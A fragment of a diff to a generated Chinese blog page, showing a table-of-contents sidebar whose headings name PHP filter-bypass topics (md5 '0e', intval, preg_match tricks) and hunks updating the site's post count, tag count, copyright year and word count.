class="nav-number">2.8.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval-%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">2.8.1.</span> <span class="nav-text">eval 注释符绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">php函数绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#md5"><span class="nav-number">3.1.</span> <span class="nav-text">md5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0e%E7%BB%95%E8%BF%87"><span class="nav-number">3.1.1.</span> <span class="nav-text">0e绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-x3D-x3D-md5-a"><span class="nav-number">3.1.2.</span> <span class="nav-text">$a&#x3D;&#x3D;md5($a)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#intval"><span class="nav-number">3.2.</span> <span class="nav-text">intval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-match"><span class="nav-number">3.3.</span> <span class="nav-text">preg_match</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.1.</span> <span class="nav-text">回溯绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.2.</span> <span class="nav-text">数组绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.3.</span> <span class="nav-text">换行绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">4.</span> <span class="nav-text">全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SERVER"><span class="nav-number">4.1.</span> <span class="nav-text">$_SERVER</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">5.</span> <span class="nav-text">正则匹配</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8C%B9%E9%85%8D%E5%85%AC%E5%BC%8F%E8%AF%AD%E6%B3%95"><span class="nav-number">5.1.</span> <span class="nav-text">匹配公式语法</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -760,14 +846,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -794,7 +880,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -803,12 +889,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">17k</span>
+    <span title="站点总字数">30k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:02</span>
+    <span title="站点阅读时长">1:48</span>
 </div>
 
 <!--
